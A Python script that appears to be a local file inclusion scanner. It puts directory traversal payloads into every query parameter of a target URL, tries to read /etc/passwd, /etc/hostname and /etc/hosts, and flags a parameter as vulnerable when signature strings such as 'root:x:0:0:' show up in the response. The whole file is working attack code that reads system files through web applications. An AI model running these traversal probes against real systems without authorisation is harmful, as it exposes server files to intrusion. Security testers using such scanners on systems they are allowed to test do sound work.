import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


CANDIDATE_PATHS = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
]


def generate_traversal_paths(path: str) -> list[str]:
    """Generate path traversal variants for a candidate file."""

    clean_path = path.lstrip("/")

    return [
        f"../{clean_path}",
        f"../../{clean_path}",
        f"../../../{clean_path}",
        f"../../../../{clean_path}",
    ]


def detect_file_evidence(
    candidate_path: str,
    response_text: str,
) -> list[str]:
    """Return recognizable evidence for the candidate file."""

    evidence_patterns = {
        "/etc/passwd": [
            "root:x:0:0:",
            "daemon:x:1:1:",
            "www-data:x:",
        ],
        "/etc/hostname": [
            "localhost",
        ],
        "/etc/hosts": [
            "127.0.0.1",
            "localhost",
        ],
    }

    patterns = evidence_patterns.get(
        candidate_path,
        [],
    )

    return [
        pattern
        for pattern in patterns
        if pattern in response_text
    ]


def required_evidence_matches(candidate_path: str) -> int:
    """Return the minimum evidence required for a candidate."""

    if candidate_path == "/etc/passwd":
        return 2

    if candidate_path == "/etc/hosts":
        return 2

    if candidate_path == "/etc/hostname":
        return 1

    return 1


def build_test_url(
    url: str,
    parameter: str,
    payload: str,
) -> str:
    """Replace a URL parameter value with an LFI test payload."""

    parsed = urlparse(url)

    parameters = parse_qsl(
        parsed.query,
        keep_blank_values=True,
    )

    updated_parameters = []

    for key, value in parameters:
        if key == parameter:
            updated_parameters.append((key, payload))
        else:
            updated_parameters.append((key, value))

    query = urlencode(updated_parameters)

    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment,
        )
    )


def detect_parameters(url: str) -> list[str]:
    """Extract query parameters from the target URL."""

    parsed = urlparse(url)

    parameters = parse_qsl(
        parsed.query,
        keep_blank_values=True,
    )

    return [key for key, _ in parameters]


def test_lfi(
    url: str,
    timeout: float = 5.0,
) -> list[dict]:
    """Test URL parameters for possible LFI."""

    parameters = detect_parameters(url)

    if not parameters:
        raise ValueError(
            "No query parameters found. "
            "LFI testing requires a parameter such as ?file=FUZZ."
        )

    findings = []

    for parameter in parameters:

        for candidate_path in CANDIDATE_PATHS:

            traversal_paths = generate_traversal_paths(
                candidate_path
            )

            for traversal in traversal_paths:

                test_url = build_test_url(
                    url,
                    parameter,
                    traversal,
                )

                try:
                    response = requests.get(
                        test_url,
                        timeout=timeout,
                    )

                except requests.RequestException:
                    continue

                evidence_matches = detect_file_evidence(
                    candidate_path,
                    response.text,
                )

                minimum_matches = required_evidence_matches(
                    candidate_path
                )

                if len(evidence_matches) >= minimum_matches:

                    findings.append(
                        {
                            "parameter": parameter,
                            "candidate": candidate_path,
                            "traversal": traversal,
                            "status": response.status_code,
                            "evidence": (
                                f"Evidence for {candidate_path} "
                                "detected"
                            ),
                            "matched": evidence_matches,
                            "confidence": "High",
                            "url": test_url,
                        }
                    )

                    break

    return findings
